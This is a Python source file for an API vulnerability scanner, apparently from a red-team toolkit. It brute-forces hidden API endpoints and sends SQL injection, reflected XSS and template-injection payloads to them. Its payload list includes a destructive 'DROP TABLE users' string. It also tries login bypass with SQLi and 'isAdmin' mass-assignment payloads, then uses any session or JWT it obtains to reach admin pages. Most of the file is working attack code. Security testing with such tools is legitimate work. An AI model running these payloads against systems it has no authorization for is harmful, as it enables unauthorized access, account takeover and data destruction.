
import scan_engine.helpers.http_client as http_client
from scan_engine.helpers.http_client import get_session
import json
import re
import time
import urllib3
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class APIExpertScanner:
    def __init__(self, target, options=None):
        self.options = options
        self.target = target
        # RedOps2 Constants & Payloads
        self.API_PREFIXES = [
            "", "api/", "api/v1/", "api/v2/", "rest/", "v1/", "v2/", "auth/", "graphql/", "swagger/"
        ]
        self.COMMON_ENDPOINTS = [
            "login", "register", "users", "admin", "status", "health", "config", "debug", "metrics"
        ]
        self.SQLI_PAYLOADS = [
            "'", '"', "1' OR '1'='1", "admin'--", "' UNION SELECT 1--", "'; DROP TABLE users; --"
        ]
        self.XSS_PAYLOADS = [
            '<script>alert("XSS")</script>', '"><script>alert(1)</script>', "javascript:alert('XSS')"
        ]
        self.SSTI_PAYLOADS = [
            '{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>'
        ]

    def is_api_spec(self, content):
        """Checks if content is a valid Swagger/OpenAPI specification."""
        try:
            data = json.loads(content)
            if any(k in data for k in ["swagger", "openapi", "paths", "info"]):
                return True
        except Exception:
            if any(x in content for x in ["openapi:", "swagger:", "swagger-ui", "redoc-container"]):
                return True
        return False

    def advanced_discovery(self, logger=None):
        """
        Performs active fuzzing to discover hidden API endpoints.
        Ported from RedOps2 `advanced_endpoint_discovery`.
        """
        discovered = []
        if logger: logger(f"API Assault: Starting active endpoint discovery on {self.target}...", "INFO")

        # 1. Prefix Fuzzing
        for prefix in self.API_PREFIXES:
            for endpoint in self.COMMON_ENDPOINTS:
                url = urljoin(self.target, f"{prefix}{endpoint}")
                try:
                    r = http_client.get(url, options=getattr(self, "options", None), timeout=5)
                    if r.status_code in [200, 401, 403, 405, 500]:
                        # Filter out generic 404 pages that might return 200
                        if "not found" not in r.text.lower():
                            discovered.append({'url': url, 'status': r.status_code, 'path': f"{prefix}{endpoint}"})
                            if logger: logger(f"API Discovery: Found {url} ({r.status_code})", "SUCCESS")
                except Exception:
                    pass
        
        return discovered

    def assault_endpoint(self, endpoint, method="GET", logger=None):
        """
        Performs active injection attacks on a specific endpoint.
        Ported from RedOps2 `test_endpoint_security`.
        """
        findings = []
        url = endpoint['url'] if isinstance(endpoint, dict) else endpoint
        
        if logger: logger(f"API Assault: Attacking {url}...", "INFO")

        # 1. SQL Injection
        for payload in self.SQLI_PAYLOADS[:3]: # Limit to avoid DoS
            target = f"{url}?id={payload}&q={payload}"
            try:
                r = http_client.get(target, options=getattr(self, "options", None), timeout=5)
                if any(e in r.text.lower() for e in ['sql', 'mysql', 'postgresql', 'oracle', 'syntax error']):
                    findings.append({
                        "title": "CRITICAL: SQL Injection Detected",
                        "description": f"Endpoint `{url}` is vulnerable to SQL injection.\nPayload: `{payload}`\nResponse indicates database error.",
                        "severity": "critical",
                        "tool_source": "API-Assault (SQLi)",
                        "url": url
                    })
            except Exception:
                continue

        # 2. XSS (Reflected)
        for payload in self.XSS_PAYLOADS[:2]:
            target = f"{url}?q={payload}&search={payload}"
            try:
                r = http_client.get(target, options=getattr(self, "options", None), timeout=5)
                if payload in r.text:
                    findings.append({
                        "title": "HIGH: Reflected XSS",
                        "description": f"Endpoint `{url}` reflects user input without sanitization.\nPayload: `{payload}`",
                        "severity": "high",
                        "tool_source": "API-Assault (XSS)",
                        "url": url
                    })
            except Exception:
                continue

        # 3. SSTI (Hardened V8 — baseline + multi-attempt)
        try:
            baseline_r = http_client.get(url, options=getattr(self, "options", None), timeout=5)
            baseline_text = baseline_r.text
            baseline_len = len(baseline_r.content)
        except Exception:
            baseline_text = ""
            baseline_len = 0

        for payload in self.SSTI_PAYLOADS[:2]:
            target = f"{url}?template={payload}&name={payload}"
            try:
                r = http_client.get(target, options=getattr(self, "options", None), timeout=5)

                # Rule A: "49" must be present
                if "49" not in r.text:
                    continue
                # Rule B: Payload must NOT be reflected literally
                if "7*7" in r.text:
                    continue
                # Rule C: "49" must NOT be in baseline
                if "49" in baseline_text:
                    continue
                # Rule D: Content-length delta must be significant
                if abs(len(r.content) - baseline_len) < 20:
                    continue
                # Rule E: Status must match baseline
                if r.status_code != baseline_r.status_code:
                    continue
                # Rule F: Multi-attempt consistency (1 extra confirmation)
                try:
                    r2 = http_client.get(target, options=getattr(self, "options", None), timeout=5)
                    if "49" not in r2.text or "7*7" in r2.text:
                        continue
                except Exception:
                    continue

                findings.append({
                    "title": "HIGH: Probable SSTI (Unverified Engine)",
                    "description": (
                        f"Endpoint `{url}` may execute template expressions.\n"
                        f"Payload: `{payload}` → Result: 49\n"
                        f"Baseline diff: {abs(len(r.content) - baseline_len)}B delta\n"
                        f"Multi-attempt: 2/2 consistent\n\n"
                        f"**Note**: Engine not determined. Manual verification required."
                    ),
                    "severity": "high",
                    "tool_source": "API-Assault (SSTI)",
                    "url": url
                })
                break  # One finding per endpoint
            except Exception:
                continue

        return findings

    def _get_fingerprint(self, resp):
        """Generates a unique fingerprint for a response to detect meaningful changes."""
        return {
            "status": resp.status_code,
            "length": len(resp.content),
            "headers": {k.lower(): v for k, v in resp.headers.items()},
            "title": re.search(r"<title>(.*?)</title>", resp.text, re.I).group(1) if re.search(r"<title>(.*?)</title>", resp.text, re.I) else "",
            "body_hash": hash(resp.text[:5000]) # Quick hash of start of body
        }

    def _verify_privilege(self, url, session, logger=None):
        """Attempts to access protected resources using the established session."""
        protected_paths = ["/admin", "/dashboard", "/api/admin", "/api/v1/admin", "/console"]
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}/"
        
        for path in protected_paths:
            test_url = urljoin(base, path)
            try:
                r = session.get(test_url, timeout=5, allow_redirects=False)
                if r.status_code == 200 and not any(x in r.text.lower() for x in ["login", "signin", "auth"]):
                    if logger: logger(f"[AUTH_VALIDATION] Privilege Escalation Verified: Access to {test_url} SUCCESSFUL.", "SUCCESS")
                    return True, test_url
            except Exception: continue
        return False, None

    def auth_bypass_check(self, url, logger=None):
        """
        V6 EXPERT: State-Aware Authentication Bypass Validator.
        Enforces baseline comparison, JWT structural validation, and privilege verification.
        """
        findings = []
        if not any(x in url for x in ['login', 'auth', 'signin']):
            return findings

        if logger: logger(f"API Assault: Launching evidence-based Auth Bypass check on {url}...", "INFO")

        # 1. BASELINE: Perform invalid login attempt
        baseline_payload = {"username": "redops_baseline_test_ignore", "password": "wrong_password_123!"}
        try:
            r_base = http_client.post(url, options=getattr(self, "options", None), json=baseline_payload, timeout=5)
            baseline = self._get_fingerprint(r_base)
            if logger: logger(f"[AUTH_VALIDATION] Baseline established. Status: {baseline['status']}, Length: {baseline['length']}", "DEBUG")
        except Exception as e:
            if logger: logger(f"[AUTH_VALIDATION] Failed to establish baseline: {e}", "ERROR")
            return findings

        payloads = [
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "admin' --", "password": "password"},
            {"username": "admin", "password": "password", "isAdmin": True}
        ]

        for p in payloads:
            try:
                # Use a specific session to track state (cookies)
                session = get_session(self.options)
                # Ensure it times out at the individual request level
                r = session.post(url, json=p, timeout=5, verify=False, allow_redirects=False)
                attack = self._get_fingerprint(r)
                
                # --- VALIDATION ENGINE ---
                session_created = "set-cookie" in attack["headers"]
                jwt_detected = bool(re.search(r"ey[a-zA-Z0-9\-_]+\.ey[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+", r.text))
                
                # Redirect to protected path?
                redirect_to_auth = False
                if r.status_code in [301, 302, 303, 307, 308]:
                    loc = attack["headers"].get("location", "").lower()
                    if any(x in loc for x in ["admin", "dashboard", "home", "main", "wellcome"]):
                        redirect_to_auth = True

                # Privilege verification
                privilege_verified, protected_url = False, None
                if session_created or jwt_detected or redirect_to_auth:
                    # If JWT is in body, we might need to add it to session headers if it's not handled by cookies
                    if jwt_detected and "authorization" not in session.headers:
                        jwt_match = re.search(r"ey[a-zA-Z0-9\-_]+\.ey[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+", r.text)
                        if jwt_match: session.headers["Authorization"] = f"Bearer {jwt_match.group(0)}"
                    
                    privilege_verified, protected_url = self._verify_privilege(url, session, logger)

                # Baseline Comparison
                identical_to_baseline = (attack["body_hash"] == baseline["body_hash"]) and (attack["status"] == baseline["status"])
                
                # V10: Auth Cookie Classification
                # Privacy/consent/analytics cookies DO NOT count as auth
                IGNORED_COOKIES = [
                    'privacy', 'consent', 'gdpr', 'cookie_notice', 'viewed_cookie',
                    'cookielawinfo', '_ga', '_gid', '_gat', 'fbp', 'fr', 'wp_lang',
                    'wordpress_test_cookie', 'wp-settings-time'
                ]
                auth_cookie_detected = False
                AUTH_COOKIE_PATTERNS = [
                    'wordpress_logged_in', 'wp-auth', 'phpsessid', 'session',
                    'auth_token', 'access_token', 'sid', 'jsessionid'
                ]
                if session_created:
                    # Case-insensitive header lookup (handles mocks + real requests)
                    set_cookies = ''
                    for hk, hv in r.headers.items():
                        if hk.lower() == 'set-cookie':
                            set_cookies += hv.lower() + '; '
                    set_cookies = set_cookies.lower()
                    # Check if any real auth cookie is set
                    if any(ac in set_cookies for ac in AUTH_COOKIE_PATTERNS):
                        auth_cookie_detected = True
                    # Suppress if ONLY ignored cookies
                    if not auth_cookie_detected and any(ic in set_cookies for ic in IGNORED_COOKIES):
                        session_created = False  # Downgrade: not a real session

                # V10 Confidence Scoring (formal predicates)
                score = 0
                if privilege_verified and (auth_cookie_detected or jwt_detected):
                    score = 4  # CRITICAL: Full bypass proven
                elif privilege_verified:
                    score = 3  # HIGH: Access but no session proof
                elif jwt_detected and auth_cookie_detected:
                    score = 3  # HIGH: Both JWT + auth cookie
                elif jwt_detected or auth_cookie_detected:
                    score = 2  # MEDIUM: Token/cookie but no privilege
                elif not identical_to_baseline and attack["status"] == 200:
                    score = 1  # LOW: Anomaly only
                # score=0: identical to baseline → suppress
                
                # V10 Validation Path (structured, no adjectives)
                auth_validation = {
                    "auth_cookie_detected": auth_cookie_detected,
                    "jwt_detected": jwt_detected,
                    "privileged_endpoint_access": privilege_verified,
                    "protected_url": protected_url,
                    "redirect_to_auth": redirect_to_auth,
                    "baseline_identical": identical_to_baseline,
                    "score": score,
                }

                # Verdict
                verdict = "SUPPRESSED"
                if score >= 4: verdict = "CONFIRMED BYPASS"
                elif score == 3: verdict = "PROBABLE BYPASS"
                elif score == 2: verdict = "AUTH ANOMALY"
                elif score == 1: verdict = "BEHAVIORAL ANOMALY"

                if logger:
                    logger(f"[AUTH_VALIDATION] Payload: {p.get('username')}", "DEBUG")
                    logger(f"[AUTH_VALIDATION] AuthCookie: {auth_cookie_detected} | JWT: {jwt_detected} | Privilege: {privilege_verified}", "DEBUG")
                    logger(f"[AUTH_VALIDATION] Verdict: {verdict} (Score: {score})", "DEBUG")

                if score <= 1:
                    continue  # V10: score ≤ 1 → suppressed (no HIGH without proof)

                # Generate Finding
                sev = "info"
                if score == 4: sev = "critical"
                elif score == 3: sev = "high"
                elif score == 2: sev = "medium"

                # V10 Structured titles (no hype)
                title = f"{sev.upper()}: Auth Validation Result"
                if score == 4:
                    title = "CRITICAL: Authentication Bypass Verified"
                elif score == 3:
                    title = "HIGH: Authentication Bypass — Privilege Access Confirmed"
                elif score == 2:
                    title = "MEDIUM: Auth Anomaly — Manual Verification Required"

                # V10 Structured description (no adjectives, no speculation)
                desc = (
                    f"**AUTH VALIDATION RESULT (V10)**:\n"
                    f"- Auth Cookie: {'YES (' + r.headers.get('set-cookie', '')[:60] + ')' if auth_cookie_detected else 'NO'}\n"
                    f"- JWT Detected: {'YES' if jwt_detected else 'NO'}\n"
                    f"- Privileged Access: {'YES → ' + str(protected_url) if privilege_verified else 'NO'}\n"
                    f"- Redirect to Auth: {'YES' if redirect_to_auth else 'NO'}\n"
                    f"- Deterministic: {'YES' if score >= 3 else 'NO'}\n"
                    f"- Baseline Identical: {'YES' if identical_to_baseline else 'NO'}\n"
                    f"- **Score: {score}/4**\n"
                )

                # Detailed Evidence
                req_dump = f"POST {url} HTTP/1.1\nHost: {self.target}\nContent-Type: application/json\n\n{json.dumps(p)}"
                res_dump = f"HTTP/1.1 {r.status_code} {r.reason}\n"
                for k, v in r.headers.items(): res_dump += f"{k}: {v}\n"
                res_dump += f"\n{r.text[:1000]}..."

                findings.append({
                    "title": title,
                    "description": desc,
                    "severity": sev,
                    "tool_source": "API-Assault (Auth)",
                    "url": url,
                    "request": req_dump,
                    "response": res_dump,
                    "repro_command": f"curl -v -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(p)}'"
                })

                if score == 4: break  # Stop on critical success for this endpoint


            except Exception as e:
                if logger: logger(f"[AUTH_VALIDATION] Error during attack: {e}", "DEBUG")
                continue
            
        return findings

    def audit_endpoints(self, api_endpoints, logger=None):
        """
        Combined Passive + Active Audit
        """
        findings = []
        if not api_endpoints:
            return findings

        if logger: logger(f"API Expert: Analyzing {len(api_endpoints)} endpoints with ACTIVE assault...", "INFO")

        for ep in api_endpoints:
            url = ep['url']
            path = ep['path'].lower()
            
            # --- PASSIVE CHECKS (Existing RedOps3 Logic) ---
            # 1. Spec Exposure
            if any(x in path for x in ['swagger.json', 'openapi.json', 'api-docs']):
                 findings.append({
                        "title": "CRITICAL: Exposed API Specification",
                        "description": f"API Blueprint exposed at {url}",
                        "severity": "critical",
                        "tool_source": "API-Expert",
                        "url": url
                })

            # 2. Sensitive Actuator
            if 'actuator' in path or '.env' in path:
                 findings.append({
                        "title": "CRITICAL: Sensitive Endpoint Exposed",
                        "description": f"Endpoint {url} exposes internal configuration.",
                        "severity": "critical",
                        "tool_source": "API-Expert",
                        "url": url
                })

            # --- ACTIVE ASSAULT (New RedOps2 Logic) ---
            # Only attack if it looks like an API endpoint (json/xml or no extension)
            if logger: logger(f"API Assault: Targeting {url}", "DEBUG")
            
            # Injection Tests
            injection_findings = self.assault_endpoint(ep, logger=logger)
            findings.extend(injection_findings)

            # Auth Bypass
            bypass_findings = self.auth_bypass_check(url, logger=logger)
            findings.extend(bypass_findings)

        return findings
